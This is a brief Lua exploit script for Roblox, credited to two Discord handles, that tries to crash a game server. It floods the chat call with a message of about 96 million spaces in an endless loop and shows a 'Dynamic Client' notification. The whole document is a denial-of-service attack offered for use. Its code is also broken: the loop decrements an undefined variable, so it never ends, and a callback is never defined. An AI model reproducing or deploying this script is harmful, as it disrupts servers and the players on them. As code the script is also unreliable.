local NotificationBindable = Instance.new("BindableFunction")
NotificationBindable.OnInvoke = callback
--
game.StarterGui:SetCore("SendNotification",  {
	Title = "Dynamic Client";
	Text = "Crash Failed.";
	Icon = "rbxassetid://257124016";
	Duration = 3;
	Callback = NotificationBindable;
})

--Script made by Diemiers#4209-Qwerty#9972
--Method by Roblox

local v = 96000000 --Maximal bit stream on client
-- (96000000 - 12) -- Maximal bit stream that server accept +-2
local msg = ""..string.rep(" ",(v - 12))

while v > 0 do
	game.Players:Chat(msg)
  	timeRemaining = timeRemaining - 1
end
